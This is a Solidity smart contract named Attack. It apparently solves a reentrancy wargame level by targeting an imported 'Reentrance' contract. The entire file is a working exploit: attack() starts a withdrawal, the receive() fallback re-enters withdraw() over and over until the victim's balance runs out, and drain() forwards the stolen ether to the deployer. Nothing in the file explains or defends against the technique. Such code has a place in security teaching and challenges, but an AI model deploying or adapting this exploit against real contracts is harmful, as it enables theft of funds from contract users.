// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./reentrancy.sol";

contract Attack {
    Reentrance victim;
    address public owner;
    uint amount;

    constructor(address payable _victim, uint withdrawl) {
        owner = msg.sender;
        victim = Reentrance(_victim);
        amount = withdrawl;
    }

    function balance() public view returns(uint){
        return address(this).balance;
    }

    //donate first before calling attack
    function attack() public{
        victim.withdraw(amount);
    }
    
    receive() external payable {
        uint victimBalance = address(victim).balance; 
        uint withdrawlLimit = victimBalance < amount? victimBalance : amount;
        victim.withdraw(withdrawlLimit);
    }

    function drain() public {
        (bool result, ) = payable(owner).call{value: address(this).balance}("");
        if(!result){
            revert("Drain failed");
        }
    }
}